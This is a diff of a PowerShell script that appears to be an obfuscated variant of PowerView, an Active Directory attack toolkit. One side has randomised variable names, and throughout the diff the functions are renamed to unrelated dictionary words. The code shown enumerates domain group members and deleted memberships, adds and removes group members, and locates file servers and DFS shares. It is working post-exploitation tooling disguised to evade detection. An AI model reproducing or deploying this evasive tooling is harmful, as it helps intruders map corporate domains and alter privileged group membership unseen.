+                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN
+                    if ($Properties.objectsid) {
+                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                     }
                     else {
-                        $TBSJNJUH99 = $Null
+                        $MemberSID = $Null
                     }
                     try {
-                        $aZTLxyBR99 = $SdzJuWMG99.distinguishedname[0]
-                        if ($aZTLxyBR99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
+                        $MemberDN = $Properties.distinguishedname[0]
+                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                             try {
-                                if (-not $TBSJNJUH99) {
-                                    $TBSJNJUH99 = $SdzJuWMG99.cn[0]
+                                if (-not $MemberSID) {
+                                    $MemberSID = $Properties.cn[0]
                                 }
-                                $pUYOYoCO99 = kinsman -Identity $TBSJNJUH99 -OutputType 'DomainSimple' @ADNameArguments
-                                if ($pUYOYoCO99) {
-                                    $uuoLoDkc99 = $pUYOYoCO99.Split('@')[1]
+                                $MemberSimpleName = corralling -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments
+                                if ($MemberSimpleName) {
+                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                 }
                                 else {
-                                    Write-Warning "[strippers] Error converting $aZTLxyBR99"
-                                    $uuoLoDkc99 = $Null
+                                    Write-Warning "[Aesculapius] Error converting $MemberDN"
+                                    $MemberDomain = $Null
                                 }
                             }
                             catch {
-                                Write-Warning "[strippers] Error converting $aZTLxyBR99"
-                                $uuoLoDkc99 = $Null
+                                Write-Warning "[Aesculapius] Error converting $MemberDN"
+                                $MemberDomain = $Null
                             }
                         }
                         else {
-                            $uuoLoDkc99 = $aZTLxyBR99.SubString($aZTLxyBR99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
                     catch {
-                        $aZTLxyBR99 = $Null
-                        $uuoLoDkc99 = $Null
+                        $MemberDN = $Null
+                        $MemberDomain = $Null
                     }
-                    if ($SdzJuWMG99.samaccountname) {
-                        $jKgysTLK99 = $SdzJuWMG99.samaccountname[0]
+                    if ($Properties.samaccountname) {
+                        $MemberName = $Properties.samaccountname[0]
                     }
                     else {
                         try {
-                            $jKgysTLK99 = woodmen -ObjectSID $SdzJuWMG99.cn[0] @ADNameArguments
+                            $MemberName = armpits -ObjectSID $Properties.cn[0] @ADNameArguments
                         }
                         catch {
-                            $jKgysTLK99 = $SdzJuWMG99.cn[0]
+                            $MemberName = $Properties.cn[0]
                         }
                     }
-                    if ($SdzJuWMG99.objectclass -match 'computer') {
-                        $crRUCcfe99 = 'computer'
+                    if ($Properties.objectclass -match 'computer') {
+                        $MemberObjectClass = 'computer'
                     }
-                    elseif ($SdzJuWMG99.objectclass -match 'group') {
-                        $crRUCcfe99 = 'group'
+                    elseif ($Properties.objectclass -match 'group') {
+                        $MemberObjectClass = 'group'
                     }
-                    elseif ($SdzJuWMG99.objectclass -match 'user') {
-                        $crRUCcfe99 = 'user'
+                    elseif ($Properties.objectclass -match 'user') {
+                        $MemberObjectClass = 'user'
                     }
                     else {
-                        $crRUCcfe99 = $Null
+                        $MemberObjectClass = $Null
                     }
-                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberDomain' $uuoLoDkc99
-                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberName' $jKgysTLK99
-                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberDistinguishedName' $aZTLxyBR99
-                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberObjectClass' $crRUCcfe99
-                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberSID' $TBSJNJUH99
-                    $lzrMeMHC99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
-                    $lzrMeMHC99
-                    if ($PSBoundParameters['Recurse'] -and $aZTLxyBR99 -and ($crRUCcfe99 -match 'group')) {
-                        Write-Verbose "[strippers] Manually recursing on group: $aZTLxyBR99"
-                        $PPosolen99['Identity'] = $aZTLxyBR99
-                        $Null = $PPosolen99.Remove('Properties')
-                        strippers @SearcherArguments
+                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
+                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
+                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
+                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
+                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
+                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
+                    $GroupMember
+                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
+                        Write-Verbose "[Aesculapius] Manually recursing on group: $MemberDN"
+                        $SearcherArguments['Identity'] = $MemberDN
+                        $Null = $SearcherArguments.Remove('Properties')
+                        Aesculapius @SearcherArguments
                     }
                 }
             }
-            $vLzWmKPH99.dispose()
+            $GroupSearcher.dispose()
         }
     }
 }
-function predominantly {
+function Semites {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.DomainGroupMemberDeleted')]
     [CmdletBinding()]
@@ -5473,197 +5473,197 @@ function predominantly {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'Properties'    =   'msds-replvaluemetadata','distinguishedname'
             'Raw'           =   $True
             'LDAPFilter'    =   '(objectCategory=group)'
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
     PROCESS {
-        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
-        farrowing @SearcherArguments | ForEach-Object {
-            $HxrwipaH99 = $_.Properties['distinguishedname'][0]
-            ForEach($gsLTSbEi99 in $_.Properties['msds-replvaluemetadata']) {
-                $pczMbpLs99 = [xml]$gsLTSbEi99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
-                if ($pczMbpLs99) {
-                    if (($pczMbpLs99.pszAttributeName -Match 'member') -and (($pczMbpLs99.dwVersion % 2) -eq 0 )) {
-                        $ERfozkEO99 = New-Object PSObject
-                        $ERfozkEO99 | Add-Member NoteProperty 'GroupDN' $HxrwipaH99
-                        $ERfozkEO99 | Add-Member NoteProperty 'MemberDN' $pczMbpLs99.pszObjectDn
-                        $ERfozkEO99 | Add-Member NoteProperty 'TimeFirstAdded' $pczMbpLs99.ftimeCreated
-                        $ERfozkEO99 | Add-Member NoteProperty 'TimeDeleted' $pczMbpLs99.ftimeDeleted
-                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingChange' $pczMbpLs99.ftimeLastOriginatingChange
-                        $ERfozkEO99 | Add-Member NoteProperty 'TimesAdded' ($pczMbpLs99.dwVersion / 2)
-                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $pczMbpLs99.pszLastOriginatingDsaDN
-                        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
-                        $ERfozkEO99
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
+        dermatitis @SearcherArguments | ForEach-Object {
+            $ObjectDN = $_.Properties['distinguishedname'][0]
+            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
+                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
+                if ($TempObject) {
+                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
+                        $Output = New-Object PSObject
+                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
+                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
+                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
+                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
+                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
+                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
+                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
+                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
+                        $Output
                     }
                 }
                 else {
-                    Write-Verbose "[predominantly] Error retrieving 'msds-replvaluemetadata' for '$HxrwipaH99'"
+                    Write-Verbose "[Semites] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                 }
             }
         }
     }
 }
-function nasalizing {
+function logins {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True)]
         [Alias('GroupName', 'GroupIdentity')]
         [String]
-        $BfpbWwpi99,
+        $Identity,
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
         [String[]]
-        $SvCMbRzc99,
+        $Members,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $cqurrley99 = @{
-            'Identity' = $BfpbWwpi99
+        $ContextArguments = @{
+            'Identity' = $Identity
         }
-        if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
-        $blCNDyjh99 = Piedmont @ContextArguments
-        if ($blCNDyjh99) {
+        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+        $GroupContext = demarcates @ContextArguments
+        if ($GroupContext) {
             try {
-                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($blCNDyjh99.Context, $blCNDyjh99.Identity)
+                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
             }
             catch {
-                Write-Warning "[nasalizing] Error finding the group identity '$BfpbWwpi99' : $_"
+                Write-Warning "[logins] Error finding the group identity '$Identity' : $_"
             }
         }
     }
     PROCESS {
         if ($Group) {
-            ForEach ($cgTuSBdj99 in $SvCMbRzc99) {
-                if ($cgTuSBdj99 -match '.+\\.+') {
-                    $cqurrley99['Identity'] = $cgTuSBdj99
-                    $FqkHMcxT99 = Piedmont @ContextArguments
-                    if ($FqkHMcxT99) {
-                        $rqcypngr99 = $FqkHMcxT99.Identity
+            ForEach ($Member in $Members) {
+                if ($Member -match '.+\\.+') {
+                    $ContextArguments['Identity'] = $Member
+                    $UserContext = demarcates @ContextArguments
+                    if ($UserContext) {
+                        $UserIdentity = $UserContext.Identity
                     }
                 }
                 else {
-                    $FqkHMcxT99 = $blCNDyjh99
-                    $rqcypngr99 = $cgTuSBdj99
+                    $UserContext = $GroupContext
+                    $UserIdentity = $Member
                 }
-                Write-Verbose "[nasalizing] Adding member '$cgTuSBdj99' to group '$BfpbWwpi99'"
-                $cgTuSBdj99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($FqkHMcxT99.Context, $rqcypngr99)
-                $Group.Members.Add($cgTuSBdj99)
+                Write-Verbose "[logins] Adding member '$Member' to group '$Identity'"
+                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
+                $Group.Members.Add($Member)
                 $Group.Save()
             }
         }
     }
 }
-function cafeteria {
+function congealing {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True)]
         [Alias('GroupName', 'GroupIdentity')]
         [String]
-        $BfpbWwpi99,
+        $Identity,
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
         [String[]]
-        $SvCMbRzc99,
+        $Members,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $cqurrley99 = @{
-            'Identity' = $BfpbWwpi99
+        $ContextArguments = @{
+            'Identity' = $Identity
         }
-        if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
-        $blCNDyjh99 = Piedmont @ContextArguments
-        if ($blCNDyjh99) {
+        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+        $GroupContext = demarcates @ContextArguments
+        if ($GroupContext) {
             try {
-                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($blCNDyjh99.Context, $blCNDyjh99.Identity)
+                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
             }
             catch {
-                Write-Warning "[cafeteria] Error finding the group identity '$BfpbWwpi99' : $_"
+                Write-Warning "[congealing] Error finding the group identity '$Identity' : $_"
             }
         }
     }
     PROCESS {
         if ($Group) {
-            ForEach ($cgTuSBdj99 in $SvCMbRzc99) {
-                if ($cgTuSBdj99 -match '.+\\.+') {
-                    $cqurrley99['Identity'] = $cgTuSBdj99
-                    $FqkHMcxT99 = Piedmont @ContextArguments
-                    if ($FqkHMcxT99) {
-                        $rqcypngr99 = $FqkHMcxT99.Identity
+            ForEach ($Member in $Members) {
+                if ($Member -match '.+\\.+') {
+                    $ContextArguments['Identity'] = $Member
+                    $UserContext = demarcates @ContextArguments
+                    if ($UserContext) {
+                        $UserIdentity = $UserContext.Identity
                     }
                 }
                 else {
-                    $FqkHMcxT99 = $blCNDyjh99
-                    $rqcypngr99 = $cgTuSBdj99
+                    $UserContext = $GroupContext
+                    $UserIdentity = $Member
                 }
-                Write-Verbose "[cafeteria] Removing member '$cgTuSBdj99' from group '$BfpbWwpi99'"
-                $cgTuSBdj99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($FqkHMcxT99.Context, $rqcypngr99)
-                $Group.Members.Remove($cgTuSBdj99)
+                Write-Verbose "[congealing] Removing member '$Member' from group '$Identity'"
+                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
+                $Group.Members.Remove($Member)
                 $Group.Save()
             }
         }
     }
 }
-function furloughing {
+function witchery {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
     [CmdletBinding()]
@@ -5672,36 +5672,36 @@ function furloughing {
         [ValidateNotNullOrEmpty()]
         [Alias('DomainName', 'Name')]
         [String[]]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        function amphitheater {
+        function serious {
             Param([String]$Path)
             if ($Path -and ($Path.split('\\').Count -ge 3)) {
                 $Temp = $Path.split('\\')[2]
@@ -5710,33 +5710,33 @@ function furloughing {
                 }
             }
         }
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
             'Properties' = 'homedirectory,scriptpath,profilepath'
         }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
     PROCESS {
         if ($PSBoundParameters['Domain']) {
-            ForEach ($IayDthuO99 in $SSNUOPgW99) {
-                $PPosolen99['Domain'] = $IayDthuO99
-                $llxUonve99 = watersides @SearcherArguments
-                $(ForEach($SPyFXTsh99 in $llxUonve99.FindAll()) {if ($SPyFXTsh99.Properties['homedirectory']) {amphitheater($SPyFXTsh99.Properties['homedirectory'])}if ($SPyFXTsh99.Properties['scriptpath']) {amphitheater($SPyFXTsh99.Properties['scriptpath'])}if ($SPyFXTsh99.Properties['profilepath']) {amphitheater($SPyFXTsh99.Properties['profilepath'])}}) | Sort-Object -Unique
+            ForEach ($TargetDomain in $Domain) {
+                $SearcherArguments['Domain'] = $TargetDomain
+                $UserSearcher = deadly @SearcherArguments
+                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {serious($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {serious($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {serious($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
             }
         }
         else {
-            $llxUonve99 = watersides @SearcherArguments
-            $(ForEach($SPyFXTsh99 in $llxUonve99.FindAll()) {if ($SPyFXTsh99.Properties['homedirectory']) {amphitheater($SPyFXTsh99.Properties['homedirectory'])}if ($SPyFXTsh99.Properties['scriptpath']) {amphitheater($SPyFXTsh99.Properties['scriptpath'])}if ($SPyFXTsh99.Properties['profilepath']) {amphitheater($SPyFXTsh99.Properties['profilepath'])}}) | Sort-Object -Unique
+            $UserSearcher = deadly @SearcherArguments
+            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {serious($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {serious($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {serious($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
         }
     }
 }
-function wheezes {
+function throwaways {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
@@ -5747,330 +5747,330 @@ function wheezes {
         [ValidateNotNullOrEmpty()]
         [Alias('DomainName', 'Name')]
         [String[]]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateSet('All', 'V1', '1', 'V2', '2')]
         [String]
-        $qSIaVQrH99 = 'All'
+        $Version = 'All'
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        function nubile {
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        function stylists {
             [CmdletBinding()]
             Param(
                 [Byte[]]
                 $Pkt
             )
             $bin = $Pkt
-            $jENAJwFi99 = [bitconverter]::ToUInt32($bin[0..3],0)
-            $KQJUFTqC99 = [bitconverter]::ToUInt32($bin[4..7],0)
-            $KUsFrgdb99 = 8
-            $WgKYvPMi99 = @()
-            for($i=1; $i -le $KQJUFTqC99; $i++){
-                $yoPETexz99 = $KUsFrgdb99
-                $cBevlUSe99 = $KUsFrgdb99 + 1
-                $ElHxYyAg99 = [bitconverter]::ToUInt16($bin[$yoPETexz99..$cBevlUSe99],0)
-                $pOZfNqRy99 = $cBevlUSe99 + 1
-                $jYvYrEsK99 = $pOZfNqRy99 + $ElHxYyAg99 - 1
-                $RAYiDLuN99 = [System.Text.Encoding]::Unicode.GetString($bin[$pOZfNqRy99..$jYvYrEsK99])
-                $HocljRhe99 = $jYvYrEsK99 + 1
-                $xEFHwqMc99 = $HocljRhe99 + 3
-                $WwMxAjSh99 = [bitconverter]::ToUInt32($bin[$HocljRhe99..$xEFHwqMc99],0)
-                $MxxSmTdE99 = $xEFHwqMc99 + 1
-                $FiBatLhP99 = $MxxSmTdE99 + $WwMxAjSh99 - 1
-                $IefZOVjV99 = $bin[$MxxSmTdE99..$FiBatLhP99]
-                switch -wildcard ($RAYiDLuN99) {
+            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
+            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
+            $offset = 8
+            $object_list = @()
+            for($i=1; $i -le $blob_element_count; $i++){
+                $blob_name_size_start = $offset
+                $blob_name_size_end = $offset + 1
+                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)
+                $blob_name_start = $blob_name_size_end + 1
+                $blob_name_end = $blob_name_start + $blob_name_size - 1
+                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])
+                $blob_data_size_start = $blob_name_end + 1
+                $blob_data_size_end = $blob_data_size_start + 3
+                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)
+                $blob_data_start = $blob_data_size_end + 1
+                $blob_data_end = $blob_data_start + $blob_data_size - 1
+                $blob_data = $bin[$blob_data_start..$blob_data_end]
+                switch -wildcard ($blob_name) {
                     "\siteroot" {  }
                     "\domainroot*" {
-                        $QHDlpyqm99 = 0
-                        $uCPmGFrs99 = 15
-                        $EiTJlUhL99 = [byte[]]$IefZOVjV99[$QHDlpyqm99..$uCPmGFrs99]
-                        $guid = New-Object Guid(,$EiTJlUhL99) # should match $dRGzfnnN99
-                        $Irkdprij99 = $uCPmGFrs99 + 1
-                        $VggmMYLD99 = $Irkdprij99 + 1
-                        $rvnQHphg99 = [bitconverter]::ToUInt16($IefZOVjV99[$Irkdprij99..$VggmMYLD99],0)
-                        $DEENosva99 = $VggmMYLD99 + 1
-                        $qondLSBa99 = $DEENosva99 + $rvnQHphg99 - 1
-                        $gPrWsTWy99 = [System.Text.Encoding]::Unicode.GetString($IefZOVjV99[$DEENosva99..$qondLSBa99])
-                        $VPDGqLkL99 = $qondLSBa99 + 1
-                        $vtgnYAHT99 = $VPDGqLkL99 + 1
-                        $TCYuoXZB99 = [bitconverter]::ToUInt16($IefZOVjV99[$VPDGqLkL99..$vtgnYAHT99],0)
-                        $HzCgdTte99 = $vtgnYAHT99 + 1
-                        $mqYZnpnj99 = $HzCgdTte99 + $TCYuoXZB99 - 1
-                        $OiuodTWG99 = [System.Text.Encoding]::Unicode.GetString($IefZOVjV99[$HzCgdTte99..$mqYZnpnj99])
